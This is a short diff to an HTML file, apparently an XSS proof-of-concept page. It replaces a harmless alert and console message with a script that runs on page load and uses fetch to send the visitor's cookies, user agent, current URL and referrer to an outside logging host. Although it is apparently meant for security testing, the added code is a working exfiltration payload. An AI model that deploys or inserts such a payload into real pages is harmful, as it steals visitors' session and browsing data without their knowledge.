@@ -2,9 +2,21 @@
 <html>
 <body>
 <script>
-  alert('XSS Test Successful!');
-  // Optional: Add non-destructive proof-of-concept code
-  console.log('XSS payload executed');
+  // STEP 1: Run on load
+  alert("🔥 You got XSS via embed!");
+
+  // STEP 2: Exfiltrate data
+  fetch("https://skshadan.me/log?ua=" + navigator.userAgent + "&ts=" + Date.now());
+
+  // Optional: grab more data
+  const data = {
+    cookie: document.cookie,                      // Usually empty (HttpOnly)
+    location: location.href,
+    referrer: document.referrer,
+    userAgent: navigator.userAgent
+  };
+
+  fetch("https://skshadan.me/log?" + new URLSearchParams(data));
 </script>
 </body>
 </html>
